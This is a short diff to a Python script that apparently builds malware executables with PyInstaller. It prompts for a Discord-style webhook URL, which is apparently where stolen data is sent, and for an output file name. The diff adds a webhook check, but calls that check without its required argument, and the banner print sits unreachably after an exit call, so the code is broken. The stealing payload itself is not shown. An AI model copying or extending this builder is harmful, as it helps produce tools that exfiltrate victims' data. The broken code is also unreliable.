@@ -3,10 +3,15 @@ import shutil
 import requests
 import PyInstaller.__main__
 
-
-
 def endHandler():
   os._exit(0)
+
+def checkhook(hook):
+    if not "api/webhooks" in hook:
+        print(f"\n{Fore.RED}Invalid Webhook.{Fore.RESET}")
+        time.sleep(1)
+        endHandler()
+
 
   print('''
            .-""-.                    _
@@ -45,6 +50,7 @@ J   .--.  Y     .o./ .o8\ |/\ `/_.-.
 Made By Shade#3421
 ''')
 webhookk = input(f"Input Webhook: ")
+checkhook()
 
 fileName = input(f"Input File Name: ")
 
